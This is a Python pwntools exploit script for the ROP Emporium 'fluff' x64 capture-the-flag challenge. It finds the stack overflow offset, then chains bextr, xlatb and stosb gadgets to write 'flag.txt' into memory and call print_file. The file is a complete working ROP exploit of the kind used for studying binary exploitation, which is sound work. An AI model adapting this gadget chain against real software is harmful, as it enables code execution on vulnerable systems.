# Some of this code is adapted from other writeups, check them out (they probs explained better than me xD)
# https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py
# https://github.com/rmccarth/binexp/blob/main/ropemporium-64bit/fluff/exploit.py
# https://blog.r0kithax.com/ctf/infosec/2020/10/12/rop-emporium-fluff-x64.html

from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './fluff'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of RSP (RIP) at the time of crashing
    rip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located RIP offset at {a}'.format(a=rip_offset))
    # Return the EIP offset
    return rip_offset


# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100))

# Start program
io = start()

# Address of .data section (size=8 bytes)
data_section_address = 0x601028

# bextr = extract contiguous bits from rcx using index + length specified in rdx and write result to rbx - https://www.felixcloutier.com/x86/bextr
# pop rdx; - (index + length)
# pop rcx; - (byte we want to write)
# add rcx, 0x3ef2; - (we'll need to subtract this from our rcx value before hand?)
# bextr rbx, rcx, rdx; ret; - (perform bextr on rcx + rdx and place result in rbx)
bextr_rbx_rcx_rdx = 0x40062a  # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;

# Place *ptr to the bextr result which is dl (rbx), into al (rax) ready for stosb
# https://www.felixcloutier.com/x86/xlat:xlatb
xlatb = 0x400628  # xlat BYTE PTR ds:[rbx]; ret;

# Pop address of .data section offset to RDI ready for stosb
# We'll also use this later to prepare parameter before calling print_file
pop_rdi = 0x4006a3  # pop rdi; ret;

# Store string (byte) from al (LSB of rax) in memory location (*ptr) pointed to by rdi
# https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq
stosb_rdi_al = 0x400639  # stosb byte ptr [rdi], al; ret;

# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x400620

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;", bextr_rbx_rcx_rdx)
info("%#x xlat BYTE PTR ds:[rbx]; ret;", xlatb)
info("%#x pop rdi; ret;", pop_rdi)
info("%#x stosb byte ptr [rdi], al; ret;", stosb_rdi_al)
info("%#x print_file", print_file)

string_to_write = b"flag.txt"  # String we want to write to memory
char_locations = []  # Store the location of each char
# Find the memory location for each char
for char in string_to_write:
    # Find the memory address of each char (adding the exe offset which is 0x400000)
    char_addr = hex(read('fluff').find(char) + elf.address)
    char_locations.append(char_addr)
    info("%s found @ %s", chr(char), char_addr)

# Initial rax value (can find by breakpoint @ *pwnme+150 and checking rax)
current_rax = 0xb
fluff_xploit = b""

for i, char_location in enumerate(char_locations):
    # If dealing with first char, we use initial rax value defined above
    if(i != 0):
        # If not, set the current rax value to previous char
        current_rax = string_to_write[i - 1]
    # Pop rdx (index + length), rcx (current char location)
    # Add rcx, 0x3ef2 (hence we subtract this)
    # bextr rbx, rcx, rdx (perform bit field extract)
    fluff_xploit += pack(bextr_rbx_rcx_rdx)
    fluff_xploit += pack(0x4000)  # Length = 40 (64 bits), Index = 00
    # Current char - we subtract previous rax (because we are looping) + hardcoded value
    fluff_xploit += pack(int(char_location, 16) - current_rax - 0x3ef2)
    # Move bextr result from dl (rbx) into al (rax) ready for stosb
    fluff_xploit += pack(xlatb)
    # Pop address of .data section offset to rdi ready for stosb
    fluff_xploit += pack(pop_rdi)
    # Address of .data section with offset to char within string we are currently writing
    fluff_xploit += pack(data_section_address + i)
    # Store string (byte) from al (LSB of rax) in memory location pointed to by rdi
    fluff_xploit += pack(stosb_rdi_al)


# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 40 bytes
    # Magic happens here
    fluff_xploit,
    # Pop the data address to RDI and call print_file
    pop_rdi,
    data_section_address,
    print_file
)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
